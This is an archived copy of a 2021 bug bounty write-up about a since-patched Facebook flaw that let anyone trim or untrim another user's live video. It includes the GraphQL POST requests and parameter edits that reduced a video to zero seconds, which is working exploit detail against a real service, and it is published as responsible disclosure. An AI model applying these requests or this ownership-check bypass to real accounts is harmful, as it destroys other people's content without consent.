---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-04-17_poc-remove-any-facebooks-live-video-14000-bounty.md
original_filename: 2021-04-17_poc-remove-any-facebooks-live-video-14000-bounty.md
title: (POC) Remove any Facebook’s live video ($14,000 bounty)
category: documents
detected_topics:
- command-injection
- graphql
- business-logic
- api-security
tags:
- imported
- documents
- command-injection
- graphql
- business-logic
- api-security
language: en
raw_sha256: ea8260797b6c0b831b7036a24e6fc1c1a7aa894178e5267f70d81e244274afe0
text_sha256: 65fff2c97c1cf54efcfb6ae9ea0e4231f8219e06cc227c70963b6e037050d938
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# (POC) Remove any Facebook’s live video ($14,000 bounty)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-04-17_poc-remove-any-facebooks-live-video-14000-bounty.md
- Source Type: markdown
- Detected Topics: command-injection, graphql, business-logic, api-security
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `ea8260797b6c0b831b7036a24e6fc1c1a7aa894178e5267f70d81e244274afe0`
- Text SHA256: `65fff2c97c1cf54efcfb6ae9ea0e4231f8219e06cc227c70963b6e037050d938`


## Content

---
title: "(POC) Remove any Facebook’s live video ($14,000 bounty)"
url: "https://edmundaa222.medium.com/poc-remove-any-facebooks-live-video-14-000-bounty-70c8135b7b4c"
authors: ["Ahmad Talahmeh"]
programs: ["Meta / Facebook"]
bugs: ["Logic flaw"]
bounty: "14,000"
publication_date: "2021-04-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3734
scraped_via: "browseros"
---

# (POC) Remove any Facebook’s live video ($14,000 bounty)

(POC) Remove any Facebook’s live video ($14,000 bounty)
Ahmad Talahmeh
Follow
2 min read
·
Apr 18, 2021

293

Press enter or click to view image in full size
Description / Impact

There is a feature (video trimming) which allow Facebook users to remove unnecessary content from their live videos.Only owners can made this on their behalf but according to my testing I observe that it is possible to trim any live video on behalf of the owners which isn’t expected behavior

Impact

Anyone can trim any live video on Facebook. Trimming video to 5 milliseconds will cause the video to be 0 seconds long and the owner won’t be able to untrim it.

Proof Of Concept / Reprosteps

1. Obtain target live video ID
2. Obtain current user ID
3. Copy the request

POST
/api/graphql/?__a=1&doc_id=3975916122480615&variables{"input":{"end_time_ms":12000,"start_time_ms":0,"video_id":"valueFromStepOne","actor_id":"ValueFromStepTwo","client_mutation_id":"1"}}

4.Update the field
end_time_ms by time in millisecond which you want the video to end (1 second = 1000 MS, which 10000 MS = 10 seconds), if the video duration is 5 minutes long , the result will make the duration of the video 10 seconds only.

5. Submit the request

Response

{
“errors”:
{
…
“code”: 1675030,
…
}

The response returned an error #1675030 but it’s done.

Update the field (end_time_ms) again to remove the video content
end_time_ms:1
This will remove the video content (owner become unable to restore the original video)

The original video duration become 0 seconds long

Get Ahmad Talahmeh’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Assume that the owner has been trimmed their live video.

Untrim the video via (attacker)

- Submit the request

POST
/api/graphql/?__a=1&doc_id=3989508527791126&variables{"input":{"video_id":"ValueFromStepOne","actor_id":"valueFromStepTwo","client_mutation_id":"25"}}

Response

{
“errors”:
{
…
“code”: 1675030,
…
}

the response returned an error #1675030, but it’s done (this will result in a privacy issue!)

Impact

Anyone can trim/untrim any live video on Facebook. Trimming video to 5 milliseconds will cause the video to be 0 seconds long and the owner won’t be able to untrim it.

Timeline

25/09/2020: Report sent

Triaged by Facebook after 2 hours

28/09/2020: Patch confirmed by Facebook

10/10/2020: $11,000 bounty awarded during BountyCon 2020 (with bonus)

12/10/2020: Additional $1150 bounty awarded by Facebook (with bonus)

12/10/2020: Additional $2300 bounty awarded by Facebook (with bonus)
